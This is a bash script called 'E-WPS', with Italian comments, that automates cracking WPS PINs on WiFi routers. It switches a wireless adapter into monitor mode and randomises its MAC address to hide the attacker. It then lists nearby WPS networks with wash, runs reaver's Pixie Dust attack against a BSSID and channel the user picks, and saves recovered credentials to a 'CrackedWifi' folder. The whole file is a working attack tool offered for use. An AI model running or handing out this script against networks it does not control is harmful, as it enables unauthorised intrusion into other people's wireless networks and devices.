#!/bin/bash

#    E-WPS - The easiest way to crack WPS
#    Copyright (C) 2015-2016
#    Script by Leprechaun
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
#
#    E-Mail: leproide@paranoici.org
#    PGP: https://pgp.mit.edu/pks/lookup?op=get&search=0x8FF24099181CE01E

# -------------------------------------------------------------------------------

#Controllo se l'utente è root
if [ “$(id -u)” != “0” ]; then
tput setaf 1; tput bold; echo -e '\nQuesto script va avviato come root\n' 2>&1
exit 1
fi

#Pulisco il terminale e mostro il logo
clear
tput setaf 3; tput bold;
echo ' ___________          __      ____________  _________'
echo ' \_   _____/         /  \    /  \         \/   _____/'
echo '  |    __)_   ______ \   \/\/   /|     ___/\_____  \'
echo '  |        \ /_____/  \        / |    |    /        \'
echo ' /_______  /           \__/\  /  |____|   /_______  /'
echo '         \/                 \/                    \/'
tput setaf 1; tput bold;
echo -e "\n			The easiest way to crack WPS"

#Inizio script
tput setaf 4; tput bold;
echo -e "\n\nVisualizzo gli adattatori di rete WiFi..."
tput setaf 7; tput bold;
ifconfig | grep "wl" -A 1
tput setaf 4; tput bold;
echo -e "\nQuale wlan vuoi utilizzare? (default wlan0)"
tput setaf 7; tput bold;
read wadapter
if [ -z "$wadapter" ]; then
wadapter=wlan0
fi
clear

#Controllo che non sia già in modalità monitor
statowlan=$(iwconfig $wadapter |grep -o "Mode:Monitor")
if [ -z "$statowlan" ]; then

tput setaf 2; tput bold;
echo "Interfaccia down..."
ip link set $wadapter down || { tput setaf 1; tput bold; echo -e "\nErrore: non riesco a disattivare l'adattatore di rete" ; exit 1; }
sleep 2
echo "iwconfig monitor..."
iwconfig $wadapter mode monitor || { tput setaf 1; tput bold; echo -e "\nErrore: non riesco ad inizializzare la modalità monitor" ; exit 1; }
sleep 2
echo "Random MAC..."
tput setaf 7; tput bold;
macchanger -r $wadapter || { tput setaf 1; tput bold; echo -e "\nErrore: non riesco a impostare un MAC casuale" ; exit 1; }
sleep 2
tput setaf 2; tput bold;
echo "Interfaccia up..."
ip link set  $wadapter up || { tput setaf 1; tput bold; echo -e "\nErrore: non riesco a riattivare l'adattatore di rete" ; exit 1; }
sleep 2

else 

#Chiedo se cambiare MAC a un interfaccia già in monitor
tput setaf 2; tput bold;
echo -e "\nL'adattore è già in modalità monitor, vuoi cambiare MAC?"
echo -e "\nc+enter per cambiare - enter per continuare con il MAC attuale"
tput setaf 7; tput bold;
read cambiomac
case $cambiomac in
c)
tput setaf 2; tput bold;
echo "Interfaccia down..."
ip link set $wadapter down || { tput setaf 1; tput bold; echo -e "\nErrore: non riesco a disattivare l'adattatore di rete" ; exit 1; }
sleep 2
echo "Random MAC..."
tput setaf 7; tput bold;
macchanger -r $wadapter || { tput setaf 1; tput bold; echo -e "\nErrore: non riesco a impostare un MAC casuale" ; exit 1; }
sleep 2
tput setaf 2; tput bold;
echo "Interfaccia up..."
ip link set  $wadapter up || { tput setaf 1; tput bold; echo -e "\nErrore: non riesco a riattivare l'adattatore di rete" ; exit 1; }
sleep 2
;;

*)
clear
tput setaf 2; tput bold;
echo -e "\nContinuiamo..."
;;
esac

sleep 2

fi

#Visualizzo le impostazioni della rete
clear
tput setaf 4; tput bold;
echo -e "\nVisualizzo le impostazioni correnti:"
tput setaf 7; tput bold;
macchanger -s $wadapter |grep "Current MAC:"
echo "--------------------"
iwconfig $wadapter |grep "Mode:"
tput setaf 4; tput bold;
echo -e "\n~Terminato~"
sleep 2

#Controllo se esiste la cartella di lavoro altrimenti la creo
if [ -d "CrackedWifi" ]; then
tput setaf 2; tput bold;
               echo -e "\nCartella di lavoro presente, proseguo..."
            else
tput setaf 1; tput bold;
               echo -e "\nCreo la cartella di lavoro..."
               mkdir "CrackedWifi"
            fi

#Ciclo di cracking
while true
do

#Imposto una trappola
int_trap() {
    tput setaf 4; tput bold; echo -e "\nCtrl-C premuto"
}
trap int_trap INT

#Avvio Wash
tput setaf 7; tput bold;
wash -i $wadapter

#Richiedo i parametri per reaver
tput setaf 1; tput bold;
echo -e "\nMAC da attaccare:"
tput setaf 7;
read bssid
tput setaf 1; tput bold;
echo "Canale:"
tput setaf 7;
read chn
clear

#Controllo che la rete non sia già stata crackata
if [ -f CrackedWifi/${bssid} ]; then
tput setaf 1; tput bold;
echo -e "\nEsiste già un file legato a questa rete all'interno della directory di lavoro..."
else

#Avvio reaver
reaver -i $wadapter -b $bssid -c $chn -K 1 -vv |tee CrackedWifi/${bssid} && echo "Cracking completo" || { echo "Qualcosa è andato storto..." ; rm -f CrackedWifi/${bssid} ; }
fi

#Chiedo all'utente se uscire per ovviare alla trappola
tput setaf 4; tput bold;
echo -e "\nenter per continuare - e+enter per uscire"
tput setaf 7;
read scelta
case $scelta in
e)
exit
;;

*)
clear
tput setaf 2; tput bold;
echo -e "\nContinuiamo..."
;;
esac

#Ricomincio con il ciclo
done
